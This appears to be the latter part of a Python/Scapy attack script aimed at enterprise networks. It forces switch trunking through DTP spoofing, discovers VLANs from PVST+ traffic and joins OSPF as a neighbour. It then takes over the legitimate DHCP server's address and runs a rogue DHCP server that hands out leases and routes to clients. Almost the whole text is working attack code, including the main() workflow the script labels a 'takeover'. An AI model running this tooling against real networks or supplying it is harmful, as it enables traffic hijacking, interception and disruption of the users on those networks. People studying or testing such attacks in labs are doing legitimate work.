    print_step("OK", f"Reserved proposed lease {address} on {dhcp_network['network']}")
    return address


def lease_next_available_address(dhcp_network, requested_address=None):
    """Prefer the requested address, then reserve the next free .2 through .253."""
    network = dhcp_network["network"]

    if requested_address and is_lease_address_available(dhcp_network, requested_address):
        return reserve_lease_address(dhcp_network, requested_address)
    if requested_address:
        print_step("SKIP", f"Requested lease {requested_address} is unavailable on {network}")

    for host_number in range(LEASE_HOST_MIN, LEASE_HOST_MAX + 1):
        candidate = str(network.network_address + host_number)
        if is_lease_address_available(dhcp_network, candidate):
            return reserve_lease_address(dhcp_network, candidate)

    print_step("FAIL", f"No free lease available on {network}")
    return None


def build_dhcp_response(packet, message_type, offered_ip, dhcp_network, server_ip, server_mac=None):
    """Build a DHCPOFFER or DHCPACK for the proposed client address."""
    bootp = packet[BOOTP]
    giaddr = dhcp_network["giaddr"]
    subnet_mask = dhcp_network["subnet_mask"]
    router = dhcp_network["router"]
    vlan_id = dhcp_network.get("vlan_id")
    lease_time = get_dhcp_lease_time()
    is_relayed = dhcp_network["mode"] == "relay"
    client_mac = get_bootp_client_mac(packet)
    broadcast_requested = bool(int(bootp.flags) & 0x8000)
    dst_ip = giaddr if is_relayed or broadcast_requested else offered_ip
    dst_port = 67 if is_relayed else 68

    dhcp_options = [
        ("message-type", message_type),
        ("server_id", server_ip),
        ("subnet_mask", subnet_mask),
    ]
    if router:
        dhcp_options.append(("router", router))
    dhcp_options.extend(
        [
            ("lease_time", lease_time),
            ("renewal_time", lease_time // 2),
            ("rebinding_time", int(lease_time * 0.875)),
            "end",
        ]
    )

    # Build the BOOTP/DHCP payload first so it can be wrapped in Ethernet/VLAN
    # headers only when the incoming packet had those layers.
    response = (
        IP(src=server_ip, dst=dst_ip)
        / UDP(sport=67, dport=dst_port)
        / BOOTP(
            op=2,
            xid=bootp.xid,
            yiaddr=offered_ip,
            siaddr=server_ip,
            giaddr=giaddr,
            chaddr=bootp.chaddr,
            flags=bootp.flags,
        )
        / DHCP(options=dhcp_options)
    )

    if packet.haslayer(Ether):
        ether_layer = packet[Ether]
        if is_relayed:
            dst_mac = ether_layer.src
        else:
            dst_mac = client_mac or ether_layer.src or "ff:ff:ff:ff:ff:ff"
        ether = Ether(src=server_mac, dst=dst_mac)
        if vlan_id is not None:
            response = ether / Dot1Q(vlan=vlan_id) / response
        else:
            response = ether / response

    return response


def log_built_dhcp_response(label, packet):
    """Log the delivery fields on a built DHCP response."""
    dst_mac = packet[Ether].dst if packet.haslayer(Ether) else None
    dst_ip = packet[IP].dst if packet.haslayer(IP) else None
    print_step(
        "OK",
        f"Built {label} dst_mac={dst_mac} dst_ip={dst_ip} vlan={get_packet_vlan_id(packet)}",
    )


def offer_address_to_discover(packet, networks, proposed_leases, server_details):
    """Respond to a DHCPDISCOVER with a DHCPOFFER and return the offered IP."""
    if not packet.haslayer(BOOTP) or not is_dhcp_discover(packet):
        print_step("SKIP", "Packet is not a DHCPDISCOVER")
        return None

    giaddr = packet[BOOTP].giaddr
    print_step("START", f"Processing DHCPDISCOVER xid={packet[BOOTP].xid} giaddr={giaddr}")
    dhcp_network = get_or_add_dhcp_network(packet, networks, server_details)

    client_key = get_client_key(packet)
    existing_offer = proposed_leases.get(client_key)
    requested_address = get_requested_address(packet)
    offered_ip = (
        existing_offer["ip_address"]
        if existing_offer
        else lease_next_available_address(dhcp_network, requested_address)
    )
    if offered_ip is None:
        return None

    server_ip = server_details["source_ip"]
    proposed_leases[client_key] = {
        "ip_address": offered_ip,
        "giaddr": dhcp_network["giaddr"],
        "dhcp_network": dhcp_network,
    }

    offer_packet = build_dhcp_response(
        packet,
        "offer",
        offered_ip,
        dhcp_network,
        server_ip,
        get_server_mac(server_details),
    )
    log_built_dhcp_response("DHCPOFFER", offer_packet)
    if dhcp_network["mode"] == "relay":
        print_step("START", f"Sending DHCPOFFER {offered_ip} to relay {giaddr}")
    else:
        print_step(
            "START",
            f"Sending DHCPOFFER {offered_ip} directly to client "
            f"on {dhcp_network['network']} with router {dhcp_network['router']}",
        )
    sendp(offer_packet, iface=server_details["interface"], verbose=False)
    print_step("OK", f"Sent DHCPOFFER {offered_ip}")
    return offered_ip


def ack_request(packet, networks, proposed_leases, server_details):
    """Respond to a matching DHCPREQUEST with a DHCPACK and return the leased IP."""
    if not packet.haslayer(BOOTP) or not is_dhcp_request(packet):
        print_step("SKIP", "Packet is not a DHCPREQUEST")
        return None

    print_step("START", f"Processing DHCPREQUEST xid={packet[BOOTP].xid} giaddr={packet[BOOTP].giaddr}")
    client_key = get_client_key(packet)
    proposed_lease = proposed_leases.get(client_key)
    if proposed_lease is None:
        print_step("FAIL", "Ignoring DHCPREQUEST with no matching proposed lease")
        return None

    requested_ip = get_requested_address(packet)
    offered_ip = proposed_lease["ip_address"]
    if requested_ip is not None and requested_ip != offered_ip:
        print_step("FAIL", f"Ignoring DHCPREQUEST for {requested_ip}; proposed {offered_ip}")
        return None

    dhcp_network = proposed_lease["dhcp_network"]
    server_ip = server_details["source_ip"]
    ack_packet = build_dhcp_response(
        packet,
        "ack",
        offered_ip,
        dhcp_network,
        server_ip,
        get_server_mac(server_details),
    )
    log_built_dhcp_response("DHCPACK", ack_packet)
    if dhcp_network["mode"] == "relay":
        print_step("START", f"Sending DHCPACK {offered_ip} to relay {dhcp_network['giaddr']}")
    else:
        print_step("START", f"Sending DHCPACK {offered_ip} directly to client")
    sendp(ack_packet, iface=server_details["interface"], verbose=False)
    print_step("OK", f"Sent DHCPACK {offered_ip}")

    dhcp_network["proposed_addresses"].discard(offered_ip)
    dhcp_network["leased_addresses"].add(offered_ip)
    del proposed_leases[client_key]
    print_step("OK", f"Recorded DHCP lease {offered_ip}")
    return offered_ip


def handle_dhcp_client_packet(packet, networks, proposed_leases, server_details):
    """Handle DHCPDISCOVER or DHCPREQUEST and return a result dictionary."""
    message_type = get_dhcp_message_type(packet)
    if message_type in DHCP_DISCOVER_TYPES:
        offered_ip = offer_address_to_discover(packet, networks, proposed_leases, server_details)
        if offered_ip:
            bootp = packet[BOOTP]
            return {
                "message_type": "discover",
                "action": "offer",
                "ip_address": offered_ip,
                "xid": bootp.xid,
                "giaddr": bootp.giaddr,
            }

    if message_type in DHCP_REQUEST_TYPES:
        leased_ip = ack_request(packet, networks, proposed_leases, server_details)
        if leased_ip:
            bootp = packet[BOOTP]
            return {
                "message_type": "request",
                "action": "ack",
                "ip_address": leased_ip,
                "xid": bootp.xid,
                "giaddr": bootp.giaddr,
            }

    return None


def sniff_for_dhcp_discover_and_request(networks, proposed_leases, server_details, timeout=None, count=0):
    """Sniff for DHCPDISCOVER/DHCPREQUEST packets, respond, and return handled events."""
    handled_events = []

    def handle_packet(packet):
        result = handle_dhcp_client_packet(packet, networks, proposed_leases, server_details)
        if result:
            handled_events.append(result)
            print_step("OK", f"Handled DHCP {result['message_type']} with {result['action']} {result['ip_address']}")

    print_step("START", f"Sniffing DHCPDISCOVER/DHCPREQUEST packets on {server_details['interface']}")
    sniff(
        iface=server_details["interface"],
        filter=DHCP_SNIFF_FILTER,
        lfilter=lambda packet: packet.haslayer(DHCP) and packet.haslayer(BOOTP),
        prn=handle_packet,
        store=False,
        timeout=timeout,
        count=count,
    )
    print_step("OK", f"Finished DHCP client sniff loop with {len(handled_events)} handled event(s)")
    return handled_events


def sniff_worker(interface, result_queue):
    offers = sniff_DHCPOffer_packets(interface, timeout=30)
    result_queue.put(offers)


def run_ospf_full_adjacency(interface, vlan_id=None):
    """Open the OSPF adjacency script in a new Kali/Linux terminal."""
    ospf_script = Path(__file__).resolve().parent.parent / "OSPF" / "ospf_full_adjacency.py"
    if not ospf_script.exists():
        raise FileNotFoundError(f"OSPF adjacency script not found: {ospf_script}")

    ospf_command = [sys.executable, str(ospf_script), "--iface", interface]
    if vlan_id is not None:
        ospf_command.extend(["--vlan", str(vlan_id)])

    if platform.system().lower() != "linux":
        print_step("START", f"Launching OSPF full adjacency script on {interface}")
        subprocess.run(ospf_command, check=True)
        return

    shell_command = " ".join(shlex.quote(str(part)) for part in ospf_command)
    terminal_shell_command = (
        f"{shell_command}; "
        "exit_code=$?; "
        "echo; "
        "echo \"OSPF adjacency script exited with status ${exit_code}.\"; "
        "read -r -p \"Press Enter to close this terminal...\"; "
        "exit ${exit_code}"
    )
    terminal_options = [
        ("x-terminal-emulator", ["-e", "bash", "-lc", terminal_shell_command]),
        ("qterminal", ["-e", "bash", "-lc", terminal_shell_command]),
        ("xfce4-terminal", ["--hold", "--command", f"bash -lc {shlex.quote(terminal_shell_command)}"]),
        ("gnome-terminal", ["--", "bash", "-lc", terminal_shell_command]),
        ("konsole", ["--noclose", "-e", "bash", "-lc", terminal_shell_command]),
        ("xterm", ["-hold", "-e", "bash", "-lc", terminal_shell_command]),
    ]

    for terminal_name, terminal_args in terminal_options:
        terminal_path = shutil.which(terminal_name)
        if terminal_path:
            print_step("START", f"Opening OSPF full adjacency script in a new terminal on {interface}")
            subprocess.Popen([terminal_path, *terminal_args])
            print_step("OK", f"OSPF full adjacency terminal launched with {terminal_name}")
            return

    raise RuntimeError(
        "No supported Linux terminal emulator found. Install x-terminal-emulator, "
        "qterminal, xfce4-terminal, gnome-terminal, konsole, or xterm."
    )


def main():
    interface = DEFAULT_INTERFACE  # change this

    # Force the Trunk!!!
    force_trunk(interface)
    countdown("Allowing trunk negotiation to settle", 10)

    dtp_stop_event, dtp_thread = start_periodic_dtp_trunking(interface)
    try:
        pvst_network_map = sniff_pvst(interface)
        discovered_vlan_ids = get_discovered_vlan_ids(pvst_network_map)
        if discovered_vlan_ids:
            print_step("OK", f"Using PVST+ discovered VLANs for DHCP probes: {discovered_vlan_ids}")
            dhcp_probe_vlan_ids = discovered_vlan_ids
        else:
            print_step(
                "WARN",
                (
                    "No PVST+ VLANs discovered; falling back to the configured "
                    f"DHCPDISCOVER VLAN sweep: {list(DEFAULT_DHCP_DISCOVER_VLANS)}"
                ),
            )
            dhcp_probe_vlan_ids = DEFAULT_DHCP_DISCOVER_VLANS

        result_queue = Queue()

        sniffer_thread = Thread(
            target=sniff_worker,
            args=(interface, result_queue),
        )

        print_step("START", "Starting DHCPOFFER sniffer thread")
        sniffer_thread.start()

        print_step("START", "Sending DHCPDISCOVER packets for selected VLANs")
        send_DHCPDiscover_VLANs(interface, dhcp_probe_vlan_ids)

        print_step("START", "Waiting for sniffer thread to finish")
        sniffer_thread.join()

        offers = result_queue.get()
        print_step("OK", f"Main thread received {len(offers)} DHCPOFFER result(s)")

        if not offers:
            print_step("FAIL", "No DHCPOFFER packets received; static address was not changed")
            return

        selected_offer = offers[0]
        selected_vlan_id = selected_offer.get("vlan")
        original_dhcp_server_ip = get_original_dhcp_server_ip(selected_offer)
        print_step("START", f"Using first DHCPOFFER result for OSPF/DHCP takeover workflow: {selected_offer}")
        ospf_interface = ensure_vlan_subinterface(interface, selected_vlan_id)
        selected_address = set_static_address_from_offer(ospf_interface, selected_offer)
        wait_for_interface_ipv4_address(ospf_interface, expected_address=selected_address)
        print_step("OK", "Offered client IP was set on the OSPF interface from the selected DHCPOFFER")

        run_ospf_full_adjacency(ospf_interface, vlan_id=selected_vlan_id)
        wait_for_ospf_adjacency_exchange(ospf_interface, selected_address)
        add_loopback_ipv4_address(original_dhcp_server_ip)

        networks = []
        proposed_leases = {}
        server_details = build_server_details_from_offer(ospf_interface, selected_offer, offers)
        print_step("START", "Starting fallback DHCP server DISCOVER/REQUEST handler")
        handled_events = sniff_for_dhcp_discover_and_request(
            networks,
            proposed_leases,
            server_details,
        )
        print_step("OK", f"Fallback DHCP handler returned {len(handled_events)} handled event(s)")
        return handled_events
    finally:
        stop_periodic_dtp_trunking(dtp_stop_event, dtp_thread)


if __name__ == "__main__":
    main()
